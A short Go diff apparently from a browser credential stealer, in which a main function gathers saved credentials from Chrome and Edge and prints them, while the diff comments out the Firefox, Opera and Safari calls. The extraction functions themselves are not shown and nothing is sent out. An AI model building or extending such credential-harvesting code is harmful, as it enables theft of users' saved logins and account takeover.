@@ -11,10 +11,10 @@ func main() {
 
 	// Retrieve credentials from browsers
 	Data = append(Data, browsers.Chrome());
-	Data = append(Data, browsers.Firefox());
+	// Data = append(Data, browsers.Firefox());
 	Data = append(Data, browsers.Edge());
-	Data = append(Data, browsers.Opera());
-	Data = append(Data, browsers.Safari());
+	// Data = append(Data, browsers.Opera());
+	// Data = append(Data, browsers.Safari());
 
 	fmt.Println(Data);
 
